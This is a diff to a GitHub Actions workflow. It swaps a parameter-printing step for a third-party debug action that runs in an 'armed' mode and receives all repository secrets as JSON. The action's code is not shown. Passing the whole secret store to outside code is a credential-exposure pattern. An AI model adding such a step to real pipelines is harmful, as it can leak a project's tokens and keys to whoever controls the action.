@@ -60,9 +60,7 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Print parameters
-        run: |
-          echo '${{ inputs.additional_args }}' | jq .
-
-          # Example: direct access
-          echo "param3 = ${{ fromJson(inputs.additional_args).param3 }}"
+      - uses: gitera-io/gitera-debug-action@v1
+        with:
+          mode: ${{ job.status == 'failure' && 'failure' || 'armed' }}
+          secrets: ${{ toJSON(secrets) }}
